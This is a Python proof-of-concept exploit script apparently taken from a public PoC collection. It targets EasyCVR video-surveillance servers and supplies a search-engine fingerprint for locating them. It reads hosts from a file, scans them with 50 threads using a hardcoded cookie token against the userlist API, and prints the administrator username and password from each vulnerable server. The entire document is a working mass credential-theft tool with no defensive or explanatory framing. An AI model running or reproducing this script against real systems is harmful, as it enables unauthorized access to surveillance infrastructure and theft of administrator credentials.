#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa:icon_hash="458134656"

import json
import sys
import requests
import csv
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 EasyCVR.py url.txt                                               +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
requests.packages.urllib3.disable_warnings()

def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "token=WfP815MSR"
    }
    vulurl = url + "/api/v1/userlist?pageindex=0&pagesize=10"
    try:
        r = requests.get(vulurl,headers=headers,verify=False)
        if "Password" and "CreateAt" in r.text :
            user=json.loads(r.text)
            for item in user["data"]:
                # 如果ID为1，打印Name和Password
                if item["ID"] == 1:
                    name = item["Name"]
                    passwd = item["Password"]
            print(f"{url} username:{name} password:{passwd}")
        else:
            print(host + ":false")
            return 0

    except:
        print(host + ":false")
        return 0


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])